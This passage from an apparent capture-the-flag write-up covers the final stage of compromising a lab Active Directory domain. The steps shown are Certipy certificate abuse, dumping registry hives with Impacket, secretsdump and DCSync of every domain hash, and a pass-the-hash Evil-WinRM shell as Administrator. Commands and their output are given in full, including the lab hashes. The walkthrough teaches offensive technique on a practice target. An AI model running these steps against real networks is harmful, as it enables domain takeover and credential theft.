[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 66
Would you like to save the private key? (y/N) 
[-] Failed to request certificate

```

Once I switch to Kerberos for auth, it works:

```

oxdf@hacky$ sudo KRB5CCNAME=svc_cabackup.ccache proxychains -q certipy req -u svc_cabackup -k -no-pass -ca mist-DC01-CA -template BackupSvcAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096 -target DC01.mist.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 65
[*] Got certificate with UPN 'svc_cabackup@mist.htb'
[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'
[*] Saved certificate and private key to 'svc_cabackup.pfx'

```

I’ll use `certipy auth` to get a ticket:

```

oxdf@hacky$ sudo proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_cabackup@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved Kirbi file to 'svc_cabackup.kirbi'
[*] Trying to retrieve NT hash for 'svc_cabackup'
[*] Got hash for 'svc_cabackup@mist.htb': aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64

```

And `ticketConverter.py` to convert it:

```

oxdf@hacky$ ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

### Recover Hashes

#### Exfil Reg Hives

[Impacket](https://github.com/SecureAuthCorp/impacket) has a `reg.py` example script that have a `backup` subcommand that will save `HKLM\SAM`, `HKLM\SYSTEM` and `HKLM\SECURITY` to a specified location on the system. A common technique here is to save the hives directly to a SMB share I control, but the network connections over proxychains was being slow and finicky, so I had better luck saving them to `C:\programdata\`:

```

oxdf@hacky$ sudo KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py -k -no-pass mist.htb/svc_cabackup@dc01.mist.htb backup -o '\programdata'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start through named pipe...
[*] Saved HKLM\SAM to \programdata\SAM.save
[*] Saved HKLM\SYSTEM to \programdata\SYSTEM.save
[*] Saved HKLM\SECURITY to \programdata\SECURITY.save

```

They are there:

```
*Evil-WinRM* PS C:\programdata> ls *.save

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/24/2024   4:10 AM          28672 SAM.save
-a----        10/24/2024   4:10 AM          36864 SECURITY.save
-a----        10/24/2024   4:10 AM       18153472 SYSTEM.save

```

I’ll download each of them through Evil-WinRM:

```
*Evil-WinRM* PS C:\programdata> download SAM.save
                                        
Info: Downloading C:\programdata\SAM.save to SAM.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata> download SECURITY.save
                                        
Info: Downloading C:\programdata\SECURITY.save to SECURITY.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata> download SYSTEM.save
                                        
Info: Downloading C:\programdata\SYSTEM.save to SYSTEM.save
                                        
Info: Download successful!

```

#### secretsdump

`secretsdump.py` will dump hashes from these hives:

```

oxdf@hacky$ secretsdump.py -sam SAM.save -security SECURITY.save  -system SYSTEM.save local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59
dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8
[*] NL$KM
 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.
 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....
 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.
 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1
NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
[*] Cleaning up...

```

#### secretsdump again

These local hashes aren’t enough to get a remote login on the system. However, the DC01$ system hash can ask for hashes, as it uses the DCSync protocol which isn’t a remote login. That means doing a remote `secretsdump.py` using the machine hash:

```

oxdf@hacky$ sudo proxychains -q secretsdump.py 'DC01$@DC01' -hashes :e768c4cf883a87ba9e96278990292260 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
MS01$:1108:aad3b435b51404eeaad3b435b51404ee:d682d620b887a24491038115b6dc56bb:::
svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:07bb1cde74ed154fcec836bc1122bdcc:::
[*] Cleaning up...

```

### Shell

The domain admin account can get a shell using Evil-WinRM:

```

oxdf@hacky$ sudo proxychains -q evil-winrm -i DC01 -u administrator -H b46782b9365344abdff1a925601e0385
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And read the final flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
205a1594************************

```